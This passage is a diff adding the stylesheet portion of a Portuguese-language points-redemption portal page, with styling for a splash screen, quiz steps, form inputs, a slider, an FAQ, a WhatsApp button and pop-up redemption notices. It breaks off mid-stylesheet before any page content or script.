@@ -1,0 +1,2096 @@
+﻿<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Portal de Pontos | Portal de Resgate</title>
+  <style>
+    :root {
+      color-scheme: light;
+      --brand: #c01836;
+      --brand-dark: #8f1029;
+      --accent: #1c8a74;
+      --accent-soft: #e8f6f3;
+      --ink: #17202a;
+      --muted: #667085;
+      --line: #e5e8ee;
+      --panel: #ffffff;
+      --bg: #f7f8fb;
+      --soft: #f0f3f8;
+      --shadow: 0 24px 70px rgba(23, 32, 42, 0.12);
+      font-family: Inter, "Segoe UI", Arial, Helvetica, sans-serif;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    * {
+      min-width: 0;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--ink);
+      overflow-x: hidden;
+    }
+
+    body.splash-active {
+      overflow: hidden;
+    }
+
+    .splash-screen {
+      position: fixed;
+      inset: 0;
+      z-index: 999;
+      display: grid;
+      place-items: center;
+      background:
+        radial-gradient(circle at 50% 35%, rgba(255, 255, 255, 0.12), transparent 34%),
+        linear-gradient(135deg, var(--brand), var(--brand-dark));
+      color: #fff;
+      opacity: 1;
+      visibility: visible;
+      transition: opacity 0.45s ease, visibility 0.45s ease;
+    }
+
+    .splash-screen.hide {
+      opacity: 0;
+      visibility: hidden;
+      pointer-events: none;
+    }
+
+    .splash-brand {
+      display: grid;
+      justify-items: center;
+      gap: 18px;
+      animation: splashPulse 1.8s ease-in-out infinite;
+    }
+
+    .splash-logo {
+      width: 92px;
+      height: 92px;
+      border-radius: 18px;
+      object-fit: cover;
+      box-shadow: 0 24px 60px rgba(0, 0, 0, 0.24);
+    }
+
+    .splash-brand strong {
+      font-size: clamp(1.6rem, 5vw, 2.7rem);
+      line-height: 1;
+      letter-spacing: 0;
+      font-weight: 900;
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    button,
+    input {
+      font: inherit;
+    }
+
+    img,
+    svg {
+      max-width: 100%;
+    }
+
+    .container {
+      width: min(1180px, calc(100% - 32px));
+      margin: 0 auto;
+    }
+
+    .site-header {
+      position: sticky;
+      top: 0;
+      z-index: 20;
+      background: rgba(255, 255, 255, 0.92);
+      border-bottom: 1px solid rgba(229, 232, 238, 0.9);
+      backdrop-filter: blur(18px);
+    }
+
+    .header-inner {
+      min-height: 84px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 22px;
+    }
+
+    .brand {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      font-weight: 800;
+      letter-spacing: 0;
+      white-space: nowrap;
+    }
+
+    .brand-name {
+      font-size: 1.12rem;
+      font-weight: 850;
+      color: #101828;
+      letter-spacing: 0;
+      line-height: 1;
+    }
+
+    .brand-mark {
+      width: 42px;
+      height: 42px;
+      border-radius: 8px;
+      background: linear-gradient(135deg, var(--brand), var(--brand-dark));
+      box-shadow: 0 10px 26px rgba(143, 21, 56, 0.22);
+      object-fit: cover;
+      display: block;
+    }
+
+    .nav {
+      display: flex;
+      align-items: center;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 4px;
+      color: #334155;
+      font-size: 0.93rem;
+      font-weight: 650;
+      padding: 6px;
+      border: 1px solid rgba(229, 232, 238, 0.95);
+      border-radius: 8px;
+      background: #f8fafc;
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.9);
+    }
+
+    .nav a {
+      position: relative;
+      min-height: 38px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 14px;
+      border-radius: 7px;
+      white-space: nowrap;
+      transition: color 0.2s ease, background 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .nav a:hover {
+      color: var(--brand);
+      background: #fff;
+      box-shadow: 0 8px 20px rgba(23, 32, 42, 0.08);
+    }
+
+    .nav a::after {
+      content: "";
+      position: absolute;
+      left: 14px;
+      right: 14px;
+      bottom: 7px;
+      height: 2px;
+      border-radius: 999px;
+      background: var(--brand);
+      opacity: 0;
+      transform: scaleX(0.45);
+      transition: opacity 0.2s ease, transform 0.2s ease;
+    }
+
+    .nav a:hover::after {
+      opacity: 1;
+      transform: scaleX(1);
+    }
+
+    .btn {
+      min-height: 46px;
+      border: 0;
+      border-radius: 8px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 9px;
+      padding: 0 18px;
+      font-weight: 750;
+      cursor: pointer;
+      transition: transform 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
+      white-space: nowrap;
+    }
+
+    .btn:hover {
+      transform: translateY(-1px);
+    }
+
+    .btn:disabled {
+      cursor: wait;
+      opacity: 0.72;
+      transform: none;
+    }
+
+    .btn-primary {
+      background: var(--brand);
+      color: #fff;
+      box-shadow: 0 14px 28px rgba(143, 21, 56, 0.22);
+    }
+
+    .btn-primary:hover {
+      background: var(--brand-dark);
+    }
+
+    .btn-secondary {
+      background: #fff;
+      color: var(--brand);
+      border: 1px solid rgba(143, 21, 56, 0.18);
+    }
+
+    .hero {
+      position: relative;
+      overflow: hidden;
+      background:
+        linear-gradient(110deg, rgba(16, 24, 40, 0.92), rgba(89, 19, 40, 0.82)),
+        url("https://images.unsplash.com/photo-1554224155-6726b3ff858f?auto=format&fit=crop&w=1800&q=80") center/cover;
+      color: #fff;
+    }
+
+    .hero-inner {
+      min-height: 620px;
+      display: grid;
+      grid-template-columns: minmax(0, 1fr) minmax(340px, 430px);
+      gap: 34px;
+      align-items: center;
+      padding: 70px 0 84px;
+    }
+
+    .eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 18px;
+      padding: 8px 12px;
+      border-radius: 8px;
+      background: rgba(255, 255, 255, 0.11);
+      color: rgba(255, 255, 255, 0.9);
+      font-size: 0.88rem;
+      font-weight: 700;
+    }
+
+    h1,
+    h2,
+    h3,
+    p {
+      margin-top: 0;
+    }
+
+    h1 {
+      max-width: 760px;
+      margin-bottom: 20px;
+      font-size: clamp(2.45rem, 6vw, 5rem);
+      line-height: 0.98;
+      letter-spacing: 0;
+    }
+
+    .hero-copy {
+      max-width: 690px;
+      margin-bottom: 30px;
+      color: rgba(255, 255, 255, 0.84);
+      font-size: 1.12rem;
+      line-height: 1.65;
+    }
+
+    .hero-actions {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+
+    .trust-panel {
+      align-self: stretch;
+      min-height: 440px;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 8px;
+      padding: 24px;
+      background: rgba(255, 255, 255, 0.12);
+      backdrop-filter: blur(18px);
+      box-shadow: var(--shadow);
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      min-width: 0;
+    }
+
+    .trust-panel h2 {
+      margin-bottom: 10px;
+      font-size: 1.35rem;
+    }
+
+    .trust-panel p {
+      color: rgba(255, 255, 255, 0.8);
+      line-height: 1.55;
+    }
+
+    .metric-grid {
+      display: grid;
+      gap: 12px;
+    }
+
+    .metric {
+      border-radius: 8px;
+      padding: 16px;
+      background: rgba(255, 255, 255, 0.12);
+      border: 1px solid rgba(255, 255, 255, 0.18);
+    }
+
+    .metric strong {
+      display: block;
+      margin-bottom: 4px;
+      font-size: 1.45rem;
+    }
+
+    .metric span {
+      color: rgba(255, 255, 255, 0.76);
+      font-size: 0.91rem;
+    }
+
+    section {
+      padding: 86px 0;
+    }
+
+    .section-head {
+      max-width: 760px;
+      margin-bottom: 32px;
+    }
+
+    .section-kicker {
+      margin-bottom: 10px;
+      color: var(--brand);
+      font-size: 0.82rem;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+    }
+
+    .section-head h2 {
+      margin-bottom: 12px;
+      font-size: clamp(1.9rem, 4vw, 3rem);
+      line-height: 1.08;
+      letter-spacing: 0;
+    }
+
+    .section-head p {
+      color: var(--muted);
+      line-height: 1.65;
+      font-size: 1.02rem;
+    }
+
+    .quiz-wrap {
+      display: grid;
+      grid-template-columns: 320px minmax(0, 1fr);
+      gap: 22px;
+      align-items: start;
+    }
+
+    .instant-callout {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 18px;
+      margin: 0 0 24px;
+      padding: 20px 22px;
+      border: 1px solid rgba(200, 24, 54, 0.18);
+      border-radius: 8px;
+      background: linear-gradient(135deg, #fff, #fff4f6);
+      box-shadow: 0 16px 42px rgba(23, 32, 42, 0.08);
+    }
+
+    .instant-callout strong {
+      display: block;
+      margin-bottom: 5px;
+      color: var(--brand);
+      font-size: 1.08rem;
+    }
+
+    .instant-callout p {
+      margin: 0;
+      color: var(--muted);
+      line-height: 1.5;
+    }
+
+    .instant-badge {
+      flex: 0 0 auto;
+      min-height: 40px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 14px;
+      border-radius: 8px;
+      background: #079455;
+      color: #fff;
+      font-weight: 850;
+      white-space: nowrap;
+      box-shadow: 0 12px 28px rgba(7, 148, 85, 0.24);
+    }
+
+    .steps {
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      padding: 14px;
+      background: var(--panel);
+      box-shadow: 0 12px 40px rgba(23, 32, 42, 0.06);
+    }
+
+    .step-item {
+      display: flex;
+      gap: 12px;
+      padding: 14px;
+      border-radius: 8px;
+      color: var(--muted);
+      transition: background 0.2s ease, color 0.2s ease;
+    }
+
+    .step-item.active {
+      background: var(--accent-soft);
+      color: var(--ink);
+    }
+
+    .step-number {
+      flex: 0 0 auto;
+      width: 30px;
+      height: 30px;
+      border-radius: 8px;
+      display: grid;
+      place-items: center;
+      background: var(--soft);
+      color: var(--brand);
+      font-weight: 800;
+    }
+
+    .step-item.active .step-number {
+      background: var(--accent);
+      color: #fff;
+    }
+
+    .step-item strong {
+      display: block;
+      margin-bottom: 3px;
+      font-size: 0.94rem;
+      color: inherit;
+    }
+
+    .step-item span {
+      font-size: 0.86rem;
+      line-height: 1.35;
+    }
+
+    .resgate-cta-panel {
+      display: grid;
+      place-items: center;
+      gap: 24px;
+      padding: clamp(34px, 7vw, 74px) 20px;
+      border: 1px solid #d7e8df;
+      border-radius: 8px;
+      background: linear-gradient(135deg, rgba(0, 154, 88, 0.1), rgba(255, 255, 255, 0.94)), #fff;
+      box-shadow: var(--shadow);
+      text-align: center;
+    }
+
+    .resgate-cta-panel h3 {
+      max-width: 680px;
+      margin: 0;
+      color: var(--ink);
+      font-size: clamp(1.65rem, 4vw, 2.55rem);
+      line-height: 1.08;
+    }
+
+    .resgate-cta-panel p {
+      max-width: 620px;
+      margin: 0;
+      color: var(--muted);
+      line-height: 1.65;
+    }
+
+    .resgate-round-button {
+      width: min(76vw, 280px);
+      aspect-ratio: 1;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 28px;
+      background: linear-gradient(145deg, #00d76f, #009b4f 70%, #087a43);
+      color: #fff;
+      font-size: clamp(1.25rem, 5vw, 2rem);
+      font-weight: 950;
+      line-height: 1.08;
+      text-align: center;
+      text-decoration: none;
+      box-shadow: 0 24px 50px rgba(0, 146, 73, 0.34), inset 0 2px 0 rgba(255, 255, 255, 0.36);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .resgate-round-button:hover {
+      transform: translateY(-3px) scale(1.03);
+      box-shadow: 0 30px 62px rgba(0, 146, 73, 0.42), inset 0 2px 0 rgba(255, 255, 255, 0.4);
+    }
+    .quiz-card {
+      min-height: 430px;
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      padding: 30px;
+      background: var(--panel);
+      box-shadow: var(--shadow);
+      animation: riseIn 0.5s ease both;
+      overflow: hidden;
+    }
+
+    .quiz-entry-title {
+      display: grid;
+      gap: 10px;
+      margin: -8px -8px 26px;
+      padding: 22px;
+      border: 1px solid #d8dee8;
+      border-radius: 8px;
+      background: #f1f3f6;
+      box-shadow: 0 14px 34px rgba(23, 32, 42, 0.08);
+      transition: border-color 0.2s ease, box-shadow 0.2s ease, transform 0.2s ease;
+    }
+
+    .quiz-entry-title:hover {
+      border-color: #c3ccd9;
+      box-shadow: 0 18px 42px rgba(23, 32, 42, 0.12);
+      transform: translateY(-1px);
+    }
+
+    .quiz-entry-title h3 {
+      margin: 0;
+      color: #111827;
+      font-size: clamp(1.45rem, 4vw, 2rem);
+      font-weight: 900;
+      line-height: 1.1;
+      text-align: center;
+    }
+
+    .quiz-entry-title p {
+      margin: 0;
+      color: #5d687a;
+      line-height: 1.55;
+      font-size: 0.98rem;
+    }
+
+    .quiz-entry-meta {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    .entry-pill {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: min(100%, 330px);
+      min-height: 34px;
+      padding: 0 12px;
+      border-radius: 8px;
+      background: #eef1f5;
+      color: #3d4656;
+      font-size: 0.82rem;
+      font-weight: 850;
+    }
+
+    .entry-pill.primary {
+      background: #111827;
+      color: #fff;
+    }
+
+    .quiz-stage {
+      display: none;
+      animation: fadeSlide 0.35s ease both;
+    }
+
+    .quiz-stage.active {
+      display: block;
+    }
+
+    .quiz-stage h3 {
+      margin-bottom: 8px;
+      font-size: 1.55rem;
+    }
+
+    .client-type-title {
+      text-align: center;
+      text-transform: uppercase;
+    }
+
+    .quiz-stage p {
+      color: var(--muted);
+      line-height: 1.6;
+    }
+
+    .quiz-stage p.form-start-text {
+      color: #145b3d;
+      font-weight: 750;
+      text-align: center;
+    }
+
+    .choice-grid {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 14px;
+      margin: 24px 0;
+    }
+
+    .choice {
+      min-height: 112px;
+      border: 1px solid #111827;
+      border-radius: 8px;
+      padding: 18px;
+      background: #fff;
+      text-align: left;
+      cursor: pointer;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease, transform 0.2s ease;
+    }
+
+    .choice:hover,
+    .choice.selected {
+      border-color: var(--accent);
+      box-shadow: 0 14px 30px rgba(28, 138, 116, 0.12);
+      transform: translateY(-1px);
+    }
+
+    .choice strong {
+      display: block;
+      margin-bottom: 7px;
+      color: var(--ink);
+      font-size: 1rem;
+    }
+
+    .choice span {
+      color: var(--muted);
+      font-size: 0.9rem;
+      line-height: 1.45;
+    }
+
+    .field-group {
+      display: grid;
+      gap: 10px;
+      margin: 24px 0;
+    }
+
+    .field-label {
+      color: var(--ink);
+      font-weight: 800;
+    }
+
+    .field-hint {
+      color: var(--muted);
+      font-size: 0.9rem;
+    }
+
+    .input {
+      width: 100%;
+      min-height: 52px;
+      border: 1px solid #ccd3dd;
+      border-radius: 8px;
+      padding: 0 15px;
+      background: #fff;
+      color: var(--ink);
+      outline: none;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+      min-width: 0;
+    }
+
+    .input:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 4px rgba(28, 138, 116, 0.12);
+    }
+
+    .quiz-actions {
+      display: flex;
+      justify-content: space-between;
+      gap: 12px;
+      margin-top: 28px;
+      flex-wrap: wrap;
+    }
+
+    .alert-box {
+      margin-top: 22px;
+      border-radius: 8px;
+      border: 1px solid #c8eadf;
+      background: #f2fbf8;
+      padding: 18px;
+      color: #145b4c;
+      line-height: 1.55;
+    }
+
+    .loading-panel,
+    .result-panel {
+      display: grid;
+      gap: 16px;
+      margin-top: 22px;
+    }
+
+    .loading-panel[hidden],
+    .result-panel[hidden] {
+      display: none;
+    }
+
+    .loading-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      color: var(--ink);
+      font-weight: 750;
+    }
+
+    .spinner {
+      width: 24px;
+      height: 24px;
+      border: 3px solid #e2e8f0;
+      border-top-color: var(--brand);
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+    }
+
+    .progress-track {
+      height: 10px;
+      border-radius: 999px;
+      overflow: hidden;
+      background: #edf2f7;
+    }
+
+    .progress-bar {
+      width: 0;
+      height: 100%;
+      border-radius: inherit;
+      background: linear-gradient(90deg, var(--brand), var(--accent));
+      transition: width 0.8s ease;
+    }
+
+    .points-box {
+      border-radius: 8px;
+      border: 1px solid rgba(200, 24, 54, 0.18);
+      background: linear-gradient(135deg, #fff, #fff6f8);
+      padding: 22px;
+    }
+
+    .points-box strong {
+      display: block;
+      margin-bottom: 8px;
+      color: var(--brand);
+      font-size: clamp(2rem, 5vw, 3rem);
+      line-height: 1;
+    }
+
+    .cards-grid {
+      display: grid;
+      grid-template-columns: repeat(4, minmax(0, 1fr));
+      gap: 16px;
+    }
+
+    .showcase {
+      display: grid;
+      grid-template-columns: minmax(0, 0.9fr) minmax(0, 1.1fr);
+      gap: 24px;
+      align-items: center;
+    }
+
+    .showcase-copy {
+      max-width: 520px;
+    }
+
+    .showcase-copy h2 {
+      margin-bottom: 14px;
+      font-size: clamp(1.9rem, 4vw, 3rem);
+      line-height: 1.08;
+      letter-spacing: 0;
+    }
+
+    .showcase-copy p {
+      color: var(--muted);
+      line-height: 1.65;
+      font-size: 1.02rem;
+    }
+
+    .slider {
+      position: relative;
+      min-height: clamp(300px, 42vw, 420px);
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: var(--shadow);
+      background: #111827;
+    }
+
+    .slide {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: flex-end;
+      padding: 28px;
+      background-position: center;
+      background-size: cover;
+      opacity: 0;
+      transform: scale(1.03);
+      transition: opacity 0.75s ease, transform 1.2s ease;
+    }
+
+    .slide::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(180deg, rgba(17, 24, 39, 0.05), rgba(17, 24, 39, 0.76));
+    }
+
+    .slide.active {
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    .slide-content {
+      position: relative;
+      z-index: 1;
+      color: #fff;
+      max-width: 480px;
+    }
+
+    .slide-content strong {
+      display: inline-flex;
+      margin-bottom: 10px;
+      padding: 7px 10px;
+      border-radius: 8px;
+      background: rgba(255, 255, 255, 0.16);
+      font-size: 0.82rem;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+    }
+
+    .slide-content h3 {
+      margin-bottom: 8px;
+      font-size: 1.65rem;
+    }
+
+    .slide-content p {
+      margin-bottom: 0;
+      color: rgba(255, 255, 255, 0.84);
+      line-height: 1.5;
+    }
+
+    .slider-dots {
+      position: absolute;
+      right: 22px;
+      bottom: 22px;
+      z-index: 2;
+      display: flex;
+      gap: 8px;
+    }
+
+    .slider-dot {
+      width: 9px;
+      height: 9px;
+      border-radius: 999px;
+      background: rgba(255, 255, 255, 0.46);
+      transition: width 0.2s ease, background 0.2s ease;
+    }
+
+    .slider-dot.active {
+      width: 28px;
+      background: #fff;
+    }
+
+    .card {
+      min-height: 196px;
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      padding: 22px;
+      background: var(--panel);
+      box-shadow: 0 12px 38px rgba(23, 32, 42, 0.06);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .card:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 18px 48px rgba(23, 32, 42, 0.1);
+    }
+
+    .icon {
+      width: 42px;
+      height: 42px;
+      border-radius: 8px;
+      display: grid;
+      place-items: center;
+      margin-bottom: 18px;
+      background: var(--accent-soft);
+      color: var(--accent);
+      font-weight: 900;
+    }
+
+    .icon svg {
+      width: 22px;
+      height: 22px;
+      stroke: currentColor;
+      stroke-width: 2.2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      fill: none;
+    }
+
+    .card h3 {
+      margin-bottom: 10px;
+      font-size: 1.05rem;
+    }
+
+    .card p {
+      margin-bottom: 0;
+      color: var(--muted);
+      line-height: 1.55;
+      font-size: 0.94rem;
+    }
+
+    .band {
+      background: #fff;
+      border-block: 1px solid var(--line);
+    }
+
+    .faq-list {
+      display: grid;
+      gap: 12px;
+    }
+
+    .faq-item {
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      background: #fff;
+      overflow: hidden;
+    }
+
+    .faq-question {
+      width: 100%;
+      min-height: 64px;
+      border: 0;
+      background: #fff;
+      color: var(--ink);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      padding: 0 20px;
+      font-weight: 800;
+      text-align: left;
+      cursor: pointer;
+    }
+
+    .faq-question span:last-child {
+      width: 28px;
+      height: 28px;
+      border-radius: 8px;
+      display: grid;
+      place-items: center;
+      background: var(--soft);
+      color: var(--brand);
+      flex: 0 0 auto;
+    }
+
+    .faq-answer {
+      display: none;
+      padding: 0 20px 20px;
+      color: var(--muted);
+      line-height: 1.6;
+    }
+
+    .faq-item.open .faq-answer {
+      display: block;
+      animation: fadeSlide 0.25s ease both;
+    }
+
+    .site-footer {
+      padding: 34px 0;
+      background: #111827;
+      color: rgba(255, 255, 255, 0.76);
+    }
+
+    .footer-inner {
+      display: flex;
+      justify-content: space-between;
+      gap: 22px;
+      align-items: center;
+    }
+
+    .footer-links {
+      display: flex;
+      gap: 18px;
+      flex-wrap: wrap;
+      font-weight: 700;
+      color: #fff;
+    }
+
+    .footer-note {
+      max-width: 560px;
+      margin: 0;
+      line-height: 1.55;
+      font-size: 0.9rem;
+    }
+
+    .whatsapp-float {
+      position: fixed;
+      right: 22px;
+      bottom: 22px;
+      z-index: 60;
+      width: 58px;
+      height: 58px;
+      border-radius: 999px;
+      display: grid;
+      place-items: center;
+      background: #25d366;
+      color: #fff;
+      box-shadow: 0 18px 36px rgba(37, 211, 102, 0.32);
+      opacity: 0;
+      pointer-events: none;
+      transform: translateY(12px) scale(0.96);
+      transition: opacity 0.2s ease, transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .whatsapp-float.show {
+      opacity: 1;
+      pointer-events: auto;
+      transform: translateY(0) scale(1);
+    }
+
+    .whatsapp-float:hover {
+      transform: translateY(-2px) scale(1);
+      box-shadow: 0 22px 44px rgba(37, 211, 102, 0.4);
+    }
+
+    .whatsapp-float svg {
+      width: 31px;
+      height: 31px;
+      fill: currentColor;
+    }
+
+    .redemption-feed {
+      position: fixed;
+      left: 12px;
+      bottom: 12px;
+      z-index: 55;
+      display: grid;
+      gap: 8px;
+      width: min(300px, calc(100vw - 24px));
+      pointer-events: none;
+    }
+
+    .redemption-toast {
+      display: grid;
+      gap: 4px;
+      padding: 10px 12px;
+      border: 1px solid rgba(200, 24, 54, 0.16);
+      border-radius: 8px;
+      background: rgba(255, 255, 255, 0.96);
+      color: var(--ink);
+      box-shadow: 0 18px 42px rgba(23, 32, 42, 0.18);
+      animation: toastIn 0.35s ease both;
+    }
+
+    .redemption-toast.hide {
+      animation: toastOut 0.28s ease both;
+    }
+
+    .redemption-toast small {
+      color: var(--brand);
+      font-size: 0.66rem;
+      font-weight: 850;
+      text-transform: uppercase;
+    }
+
+    .redemption-toast strong {
+      color: #101828;
+      font-size: 0.86rem;
+      line-height: 1.35;
+    }
+
+    .redemption-toast span {
+      color: var(--muted);
+      font-size: 0.75rem;
+    }
+
+    @keyframes riseIn {
+      from {
+        opacity: 0;
+        transform: translateY(16px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes fadeSlide {
+      from {
+        opacity: 0;
+        transform: translateY(8px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    @keyframes splashPulse {
+      0%,
+      100% {
+        transform: scale(1);
+        opacity: 0.96;
+      }
+
+      50% {
+        transform: scale(1.035);
+        opacity: 1;
+      }
+    }
+
+    @keyframes toastIn {
+      from {
+        opacity: 0;
+        transform: translateY(12px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes toastOut {
+      to {
+        opacity: 0;
+        transform: translateY(12px);
+      }
+    }
+
+    @media (max-width: 980px) {
+      .header-inner {
+        align-items: flex-start;
+        flex-direction: column;
+        padding: 16px 0;
+        gap: 14px;
+      }
+
+      .nav {
+        width: 100%;
+        display: grid;
+        grid-template-columns: repeat(3, minmax(0, 1fr));
+        overflow: visible;
+        justify-content: center;
+      }
+
+      .nav a {
+        white-space: normal;
+        text-align: center;
+        padding: 8px 10px;
+        line-height: 1.2;
+      }
+
+      .site-header .btn {
+        width: 100%;
+      }
+
+      .hero-inner,
+      .quiz-wrap,
+      .showcase {
+        grid-template-columns: 1fr;
+      }
+
+      .trust-panel {
+        min-height: auto;
+      }
+
+      .steps {
+        display: grid;
+        grid-template-columns: repeat(4, minmax(0, 1fr));
+      }
+
+      .step-item {
+        flex-direction: column;
+      }
+
+      .cards-grid {
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+      }
+    }
+
+    @media (max-width: 640px) {
+      .container {
+        width: min(100% - 24px, 1180px);
+      }
+
+      .site-header {
+        position: sticky;
+        background: rgba(255, 255, 255, 0.98);
+      }
+
+      .header-inner {
+        align-items: stretch;
+        min-height: auto;
+        padding: 12px 0 14px;
+        gap: 12px;
+      }
+
+      .brand {
+        justify-content: center;
+      }
+
+      .brand-mark {
+        width: 36px;
+        height: 36px;
+        border-radius: 7px;
+      }
+
+      .site-header .btn {
+        min-height: 42px;
+      }
+
+      .nav {
+        display: flex;
+        flex-wrap: nowrap;
+        overflow-x: auto;
+        justify-content: center;
+        gap: 6px;
+        padding: 6px;
+        background: #fff;
+        scrollbar-width: none;
+        -webkit-overflow-scrolling: touch;
+      }
+
+      .nav::-webkit-scrollbar {
+        display: none;
+      }
+
+      .nav a {
+        min-height: 36px;
+        border: 1px solid transparent;
+        background: #f8fafc;
+        font-size: 0.84rem;
+        flex: 0 0 auto;
+        min-width: max-content;
+        padding: 0 14px;
+        white-space: nowrap;
+      }
+
+      .hero {
+        background:
+          linear-gradient(180deg, rgba(16, 24, 40, 0.86), rgba(89, 19, 40, 0.84)),
+          url("https://images.unsplash.com/photo-1554224155-6726b3ff858f?auto=format&fit=crop&w=900&q=80") center/cover;
+      }
+
+      .hero-inner {
+        min-height: auto;
+        padding: 18px 0 44px;
+        gap: 18px;
+      }
+
+      .hero-inner > div:first-child {
+        text-align: center;
+        transform: translateY(-22px);
+      }
+
+      h1 {
+        margin-bottom: 16px;
+        font-size: clamp(2.05rem, 12vw, 3rem);
+        line-height: 1.04;
+        margin-left: auto;
+        margin-right: auto;
+      }
+
+      .hero-copy,
+      .section-head p,
+      .showcase-copy p {
+        font-size: 0.98rem;
+      }
+
+      .hero-copy {
+        margin-bottom: 22px;
+        line-height: 1.58;
+        margin-left: auto;
+        margin-right: auto;
+      }
+
+      .hero-actions {
+        justify-content: center;
+        gap: 10px;
+      }
+
+      .trust-panel {
+        min-height: auto;
+        padding: 18px;
+        background: rgba(255, 255, 255, 0.16);
+      }
+
+      .trust-panel h2 {
+        font-size: 1.18rem;
+      }
+
+      .metric-grid {
+        gap: 10px;
+      }
+
+      .metric {
+        padding: 14px;
+      }
+
+      .hero-actions,
+      .quiz-actions,
+      .instant-callout {
+        align-items: stretch;
+        flex-direction: column;
+      }
+
+      .btn {
+        width: 100%;
+      }
+
+      .choice-grid,
+      .cards-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .steps {
+        grid-template-columns: 1fr;
+        padding: 10px;
+      }
+
+      .step-item {
+        flex-direction: row;
+        align-items: center;
+        padding: 12px;
+      }
+
+      .resgate-cta-panel {
+      display: grid;
+      place-items: center;
+      gap: 24px;
+      padding: clamp(34px, 7vw, 74px) 20px;
+      border: 1px solid #d7e8df;
+      border-radius: 8px;
+      background: linear-gradient(135deg, rgba(0, 154, 88, 0.1), rgba(255, 255, 255, 0.94)), #fff;
+      box-shadow: var(--shadow);
+      text-align: center;
+    }
+
+    .resgate-cta-panel h3 {
+      max-width: 680px;
+      margin: 0;
+      color: var(--ink);
+      font-size: clamp(1.65rem, 4vw, 2.55rem);
+      line-height: 1.08;
+    }
+
+    .resgate-cta-panel p {
+      max-width: 620px;
+      margin: 0;
+      color: var(--muted);
+      line-height: 1.65;
+    }
+
+    .resgate-round-button {
+      width: min(76vw, 280px);
+      aspect-ratio: 1;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 28px;
+      background: linear-gradient(145deg, #00d76f, #009b4f 70%, #087a43);
+      color: #fff;
+      font-size: clamp(1.25rem, 5vw, 2rem);
+      font-weight: 950;
+      line-height: 1.08;
+      text-align: center;
+      text-decoration: none;
+      box-shadow: 0 24px 50px rgba(0, 146, 73, 0.34), inset 0 2px 0 rgba(255, 255, 255, 0.36);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .resgate-round-button:hover {
+      transform: translateY(-3px) scale(1.03);
+      box-shadow: 0 30px 62px rgba(0, 146, 73, 0.42), inset 0 2px 0 rgba(255, 255, 255, 0.4);
+    }
+    .quiz-card {
+        min-height: auto;
+        padding: 20px;
+      }
+
+      .quiz-entry-title {
+        margin: -2px -2px 22px;
+        padding: 18px;
+      }
+
+      .quiz-stage h3 {
+        font-size: 1.28rem;
+      }
+
+      .field-group {
+        margin: 18px 0;
+      }
+
+      .input {
+        min-height: 50px;
+      }
+
+      .choice {
+        min-height: auto;
+        padding: 16px;
+      }
+
+      .instant-callout {
+        padding: 18px;
+      }
+
+      .instant-badge {
+        width: 100%;
+      }
+
+      .slider {
+        min-height: 300px;
+      }
+
+      .slide {
+        padding: 20px;
+      }
+
+      .slide-content h3 {
+        font-size: 1.35rem;
+      }
+
+      section {
+        padding: 54px 0;
+      }
+
+      .section-head {
+        margin-bottom: 24px;
+      }
+
+      .section-head h2,
+      .showcase-copy h2 {
